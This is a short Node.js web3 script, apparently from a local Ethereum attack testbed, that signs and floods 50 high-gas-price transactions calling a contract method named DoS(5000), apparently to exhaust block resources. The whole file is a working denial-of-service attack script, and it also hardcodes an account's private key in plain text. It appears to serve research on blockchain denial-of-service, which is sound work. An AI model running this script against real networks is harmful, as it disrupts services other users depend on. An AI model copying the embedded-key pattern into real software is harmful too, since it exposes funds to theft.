const {Web3} = require ('web3');
const  fs = require ('fs');

// Import ABI from your contract's JSON file
const ABI = require('/home/narwhal/attack_testbed/artifacts/contracts/ConditionalExhaustCoinbaseVariant.sol/ConditionalExhaustCoinbaseVariant.json');
// const ABI = require('/home/santoshadhikari/awesome-kurtosis/smart-contract-example/artifacts/contracts/ConditionalExhaustCoinbaseVariant.sol/ConditionalExhaustCoinbaseVariant.json');  // Replace with your ABI path
const ContractABI = ABI.abi; // Extract the ABI from the JSON

// Connect to the local Ethereum node (you can use Infura if you’re using a testnet or mainnet)
const infuraUrl = "http://127.0.0.1:32887"; 
const web3 = new Web3(infuraUrl);

// Your contract address after deployment
const contractAddress = '0xb4B46bdAA835F8E4b4d8e208B6559cD267851051'; // Replace with your deployed contract address

// Your account details
const fromAddress = '0x8943545177806ED17B9F23F0a21ee5948eCaa776'; // Replace with your Ethereum account address
const privateKey = 'bcdf20249abf0ed6d944c0288fad489e33f66b3960d9e6229c1cd214ed3bbe31'; // Replace with your private key for signing the transaction

// Create contract instance
const myContract = new web3.eth.Contract(ContractABI, contractAddress);



async function callDoS(i) {
  try {
    const numberOfTransactions = 50;  // Set how many transactions you want to send
    const nonce = await web3.eth.getTransactionCount(fromAddress, 'latest');
    // const nonce = await web3.eth.getTransactionCount(fromAddress, 'pending'); // Get the nonce for pending transactions to avoid conflicts
    const nonceString = nonce.toString();

    for (let i = 0; i < numberOfTransactions; i++) {
      // Get the nonce (transaction count) for the sender address

      // Create the transaction object
      const tx = {
        from: fromAddress,
        to: contractAddress,
        gas: 5000000,  // Adjust the gas limit as needed
        gasPrice: web3.utils.toWei("200", 'gwei'),  // You can set your custom gas price
      
        //gasPrice: await web3.eth.getGasPrice(),  // You can set your custom gas price
        nonce: (parseInt(nonceString) + i).toString(), // Explicitly convert to string
        data: myContract.methods.DoS(5000).encodeABI(), // Call the DoS method with input argument 'i'
        value: '0'  // If the function is payable, you can include Ether here. Set to '0' for no Ether
      };

      // Sign the transaction with your private key
      const signedTx = await web3.eth.accounts.signTransaction(tx, privateKey);

      // Send the signed transaction to the network
      web3.eth.sendSignedTransaction(signedTx.rawTransaction);
      console.log(i)

      // Log the receipt (this shows the result of the transaction)
      //console.log('Transaction successful! Receipt:', receipt);
      //nonce++;  
    }
    } catch (error) {
      console.error('Error calling DoS:', error);
    }

}

// Call the DoS function with the argument 10 (you can change this to any value)

  callDoS(10);

